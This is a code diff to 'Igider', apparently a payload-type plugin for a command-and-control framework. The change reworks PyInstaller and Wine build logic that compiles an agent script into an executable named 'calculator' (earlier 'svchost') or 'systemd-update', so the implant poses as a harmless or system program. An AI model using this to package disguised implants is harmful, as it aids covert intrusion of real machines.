@@ -176,128 +176,223 @@ class Igider(PayloadType):
 
 
     def _create_pyinstaller_spec(self, code: str, target_os: str) -> str:
-            """Generate PyInstaller spec file for executable creation."""
-            spec_content = textwrap.dedent(f"""
-                # -*- mode: python ; coding: utf-8 -*-
+        """Generate PyInstaller spec file for executable creation."""
+        exe_name = "calculator" if target_os == "windows" else "systemd-update"
+        console_mode = "False" if target_os == "windows" else "True"
+        target_arch = "x64" if target_os == "windows" else None
+        icon_line = ''
 
-                block_cipher = None
+        spec_content = textwrap.dedent(f"""
+            # -*- mode: python ; coding: utf-8 -*-
 
-                a = Analysis(
-                    ['main.py'],
-                    pathex=[],
-                    binaries=[],
-                    datas=[],
-                    hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
-                    hookspath=[],
-                    hooksconfig={{}},
-                    runtime_hooks=[],
-                    excludes=[],
-                    win_no_prefer_redirects=False,
-                    win_private_assemblies=False,
-                    cipher=block_cipher,
-                    noarchive=False,
-                )
+            block_cipher = None
 
-                pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+            a = Analysis(
+                ['main.py'],
+                pathex=[],
+                binaries=[],
+                datas=[],
+                hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
+                hookspath=[],
+                hooksconfig={{}},
+                runtime_hooks=[],
+                excludes=[],
+                win_no_prefer_redirects=False,
+                win_private_assemblies=False,
+                cipher=block_cipher,
+                noarchive=False,
+            )
 
-                exe = EXE(
-                    pyz,
-                    a.scripts,
-                    a.binaries,
-                    a.zipfiles,
-                    a.datas,
-                    [],
-                    name='{"svchost" if target_os == "windows" else "systemd-update"}',
-                    debug=False,
-                    bootloader_ignore_signals=False,
-                    strip=False,
-                    upx=True,
-                    upx_exclude=[],
-                    runtime_tmpdir=None,
-                    console={'False' if target_os == "windows" else 'True'},
-                    disable_windowed_traceback=False,
-                    argv_emulation=False,
-                    target_arch=None,
-                    codesign_identity=None,
-                    entitlements_file=None,
-                    {'icon="icon.ico",' if target_os == "windows" else ''}
-                )
-            """)
-            return spec_content
+            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
 
-    async def _build_executable(self, code: str, target_os: str) -> bytes:
-        """Build executable using PyInstaller."""
-        # Check if PyInstaller is available
+            exe = EXE(
+                pyz,
+                a.scripts,
+                a.binaries,
+                a.zipfiles,
+                a.datas,
+                [],
+                name='{exe_name}',
+                debug=False,
+                bootloader_ignore_signals=False,
+                strip=False,
+                upx=False,  # Disable UPX to rule out compression issues
+                upx_exclude=[],
+                runtime_tmpdir=None,
+                console={console_mode},
+                disable_windowed_traceback=False,
+                argv_emulation=False,
+                target_arch='{target_arch}',
+                codesign_identity=None,
+                entitlements_file=None,
+                {icon_line}
+            )
+        """)
+        return spec_content
+    
+
+    def _build_executable(self, code: str, target_os: str) -> bytes:
+        # Check host PyInstaller
         try:
-            subprocess.run(["pyinstaller", "--version"], capture_output=True, check=True)
+            result = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], capture_output=True, check=True, text=True)
+            self.logger.info(f"Host PyInstaller version: {result.stdout.strip()}")
         except (subprocess.CalledProcessError, FileNotFoundError):
-            raise Exception("PyInstaller is not installed or not available in PATH")
+            raise Exception("PyInstaller is not installed on host or not available in PATH")
 
-        with tempfile.TemporaryDirectory() as temp_dir:
+        # Check Wine and Wine Python
+        if target_os == "windows":
+            try:
+                result = subprocess.run(["wine64", "--version"], capture_output=True, check=True, text=True)
+                self.logger.info(f"Wine version: {result.stdout.strip()}")
+                # Check if Python is installed in Wine
+                result = subprocess.run(["wine", "python3", "--version"], capture_output=True, text=True, check=False)
+                if result.returncode != 0:
+                    self.logger.info("Python not found in Wine, attempting to install...")
+                    # Verify installer exists
+                    installer_path = "/opt/python-3.9.10-amd64.exe"
+                    if not os.path.exists(installer_path):
+                        raise Exception(f"Python installer not found at {installer_path}")
+                    self.logger.info(f"Installer found at {installer_path}")
+                    # Install Python in Wine
+                    try:
+                        result = subprocess.run(
+                            ["wine", "msiexec", "/i", installer_path, "/quiet"],
+                            capture_output=True,
+                            text=True,
+                            check=True
+                        )
+                        self.logger.info(f"Python installation stdout: {result.stdout}")
+                        self.logger.info(f"Python installation stderr: {result.stderr}")
+                    except subprocess.CalledProcessError as e:
+                        raise Exception(f"Failed to install Python in Wine: {e.stderr}")
+                    # Install PyInstaller in Wine
+                    try:
+                        result = subprocess.run(
+                            ["wine", "pip", "install", "--no-cache-dir", "pyinstaller==5.13.0"],
+                            capture_output=True,
+                            text=True,
+                            check=True
+                        )
+                        self.logger.info(f"PyInstaller installation stdout: {result.stdout}")
+                        self.logger.info(f"PyInstaller installation stderr: {result.stderr}")
+                    except subprocess.CalledProcessError as e:
+                        raise Exception(f"Failed to install PyInstaller in Wine: {e.stderr}")
+                result = subprocess.run(["wine", "python3", "-m", "PyInstaller", "--version"], capture_output=True, check=True, text=True)
+                self.logger.info(f"Wine PyInstaller version: {result.stdout.strip()}")
+            except (subprocess.CalledProcessError, FileNotFoundError) as e:
+                raise Exception(f"Wine setup failed: {str(e)}")
+
+        with tempfile.TemporaryDirectory(dir="/tmp") as temp_dir:
+            os.chmod(temp_dir, 0o777)
+            self.logger.info(f"Created temp directory with permissions: {temp_dir}")
+
             # Create main Python file
             main_py = os.path.join(temp_dir, "main.py")
-            with open(main_py, "w") as f:
+            with open(main_py, "w", encoding="utf-8") as f:
                 f.write(code)
+                self.logger.info(f"Created main.py at {main_py}")
 
             # Create spec file
             spec_content = self._create_pyinstaller_spec(code, target_os)
             spec_file = os.path.join(temp_dir, "build.spec")
-            with open(spec_file, "w") as f:
+            with open(spec_file, "w", encoding="utf-8") as f:
                 f.write(spec_content)
+                self.logger.info(f"Created spec file at {spec_file}")
 
             try:
-                # Platform-specific PyInstaller command
-                cmd = ["pyinstaller", spec_file]
-                if target_os == "windows":
-                    # Use Wine for Windows builds if on Linux
-                    if os.name != "nt":  # Check if not running on Windows
-                        cmd = ["wine"] + cmd
+                # Convert Linux path to Wine path
+                wine_temp_dir = subprocess.run(
+                    ["winepath", "-w", temp_dir],
+                    capture_output=True,
+                    text=True,
+                    check=True
+                ).stdout.strip()
+                self.logger.info(f"Wine temp dir: {wine_temp_dir}")
 
-                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
+                # Run PyInstaller
+                cmd = [
+                    "wine", "python3", "-m", "PyInstaller",
+                    "--log-level=DEBUG",
+                    f"--distpath={os.path.join(temp_dir, 'dist')}",
+                    f"--workpath={os.path.join(temp_dir, 'build')}",
+                    "--clean",
+                    "--noconfirm",
+                    spec_file
+                ] if target_os == "windows" else [
+                    sys.executable, "-m", "PyInstaller",
+                    "--log-level=DEBUG",
+                    f"--distpath={os.path.join(temp_dir, 'dist')}",
+                    f"--workpath={os.path.join(temp_dir, 'build')}",
+                    "--clean",
+                    "--noconfirm",
+                    spec_file
+                ]
+                self.logger.info(f"Running command: {' '.join(cmd)}")
+                self.logger.info(f"Working directory: {temp_dir}")
+
+                env = os.environ.copy()
+                env["WINEDEBUG"] = "err+all,fixme+all"
                 result = subprocess.run(
                     cmd,
                     capture_output=True,
                     text=True,
                     cwd=temp_dir,
-                    timeout=300  # 5 minute timeout
+                    timeout=600,
+                    env=env
                 )
 
+                self.logger.info(f"PyInstaller stdout: {result.stdout}")
+                self.logger.info(f"PyInstaller stderr: {result.stderr}")
+
                 if result.returncode != 0:
-                    self.logger.error(f"PyInstaller stdout: {result.stdout}")
-                    self.logger.error(f"PyInstaller stderr: {result.stderr}")
                     raise Exception(f"PyInstaller failed with return code {result.returncode}: {result.stderr}")
 
-                # Find the generated executable
-                exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
+                # Define executable name
+                exe_name = "calculator.exe" if target_os == "windows" else "systemd-update"
                 dist_dir = os.path.join(temp_dir, "dist")
                 exe_path = os.path.join(dist_dir, exe_name)
 
-                if not os.path.exists(exe_path):
-                    # Fallback: look for any executable in dist directory
-                    if os.path.exists(dist_dir):
-                        files = [f for f in os.listdir(dist_dir) if os.path.isfile(os.path.join(dist_dir, f))]
-                        if files:
-                            exe_path = os.path.join(dist_dir, files[0])
-                            self.logger.info(f"Using fallback executable: {exe_path}")
-                        else:
-                            raise Exception(f"No executable found in {dist_dir}")
-                    else:
-                        raise Exception(f"Distribution directory not created: {dist_dir}")
+                # Check Wine's filesystem
+                wine_dist_dir = os.path.join(os.environ.get("WINEPREFIX", "/root/.wine"), "drive_c", "users", "root", "Temp", os.path.basename(temp_dir), "dist")
+                wine_exe_path = os.path.join(wine_dist_dir, exe_name)
 
-                if not os.path.exists(exe_path):
-                    raise Exception(f"Executable not found at expected path: {exe_path}")
+                self.logger.info(f"Checking for executable at: {exe_path}")
+                self.logger.info(f"Checking Wine path: {wine_exe_path}")
 
-                # Read and return the executable
+                if os.path.exists(dist_dir):
+                    self.logger.info(f"Contents of native dist dir: {os.listdir(dist_dir)}")
+                else:
+                    self.logger.info(f"Native dist dir does not exist: {dist_dir}")
+                if os.path.exists(wine_dist_dir):
+                    self.logger.info(f"Contents of Wine dist dir: {os.listdir(wine_dist_dir)}")
+                else:
+                    self.logger.info(f"Wine dist dir does not exist: {wine_dist_dir}")
+
+                wine_base = os.path.join(os.environ.get("WINEPREFIX", "/root/.wine"), "drive_c")
+                found_files = []
+                for root, _, files in os.walk(wine_base):
+                    if exe_name in files:
+                        found_files.append(os.path.join(root, exe_name))
+                if found_files:
+                    self.logger.info(f"Found executables in Wine filesystem: {found_files}")
+                    exe_path = found_files[0]
+                elif os.path.exists(exe_path):
+                    self.logger.info(f"Found executable at: {exe_path}")
+                elif os.path.exists(wine_exe_path):
+                    self.logger.info(f"Found executable in Wine path: {wine_exe_path}")
+                    exe_path = wine_exe_path
+                else:
+                    raise Exception(f"Executable not found at {exe_path} or {wine_exe_path}")
+
                 with open(exe_path, "rb") as f:
                     executable_data = f.read()
-
                 self.logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
                 return executable_data
 
             except subprocess.TimeoutExpired:
-                raise Exception("PyInstaller build timed out after 5 minutes")
+                raise Exception("PyInstaller build timed out after 10 minutes")
             except Exception as e:
-                self.logger.error(f"Executable build failed: {e}")
+                self.logger.error(f"Executable build failed: {str(e)}")
                 raise Exception(f"Failed to build executable: {str(e)}")
 
     async def build(self) -> BuildResponse:
